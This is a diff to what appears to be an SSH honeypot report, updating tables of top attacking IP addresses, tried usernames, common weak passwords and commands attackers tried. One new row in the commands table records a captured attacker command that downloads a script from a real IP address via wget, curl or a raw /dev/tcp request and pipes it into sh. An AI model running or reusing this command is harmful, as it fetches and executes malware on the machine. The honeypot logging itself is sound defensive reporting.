@@ -13,52 +13,52 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 8.222.164.227 | 4765 |
-| 120.55.180.31 | 4678 |
-| 118.190.94.60 | 4571 |
-| 47.112.1.201 | 3884 |
-| 47.239.201.124 | 2779 |
-| 8.210.118.192 | 1592 |
-| 47.236.150.50 | 920 |
-| 120.24.194.132 | 187 |
-| 154.216.19.22 | 167 |
-| 61.153.194.229 | 159 |
+| 125.70.52.249 | 17270 |
+| 8.210.118.192 | 2734 |
+| 47.239.201.124 | 2159 |
+| 47.236.150.50 | 607 |
+| 154.216.19.22 | 168 |
+| 182.92.184.12 | 159 |
+| 36.133.216.89 | 119 |
+| 39.107.96.168 | 114 |
+| 222.107.156.227 | 104 |
+| 96.78.175.36 | 104 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 461 |
-| sachin | 53 |
-| nodered | 40 |
-| ociisstd | 40 |
-| ociisprd | 37 |
-| ociispth | 37 |
-| deploy | 36 |
-| ubuntu | 34 |
-| test | 20 |
-| user | 18 |
+| ubuntu | 731 |
+| admin | 719 |
+| guest | 715 |
+| user | 715 |
+| debian | 713 |
+| dev | 713 |
+| ftp | 713 |
+| huawei | 713 |
+| inspur | 713 |
+| web | 713 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 332 |
-| password | 195 |
+| 123456 | 199 |
+| password | 116 |
+| 123 | 40 |
+| 1 | 40 |
 | 123456789 | 33 |
-| secret | 30 |
-| 123 | 18 |
-| 111111 | 18 |
-| 1 | 18 |
-| nodered123 | 14 |
-| nodered | 14 |
-| sammy | 13 |
+| 111111 | 33 |
+| 1234 | 32 |
+| 12345 | 28 |
+| test123 | 27 |
+| root | 26 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 1.94.56.119 | uname -s -m |
-| 1.94.7.129 | uname -s -m |
-| 61.153.194.229 | uname -s -m |
-| 1.194.236.112 | uname -s -m |
+| 113.44.46.107 | uname -s -m |
+| 182.92.184.12 | uname -s -m |
+| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
+| 182.92.210.172 | uname -s -m |
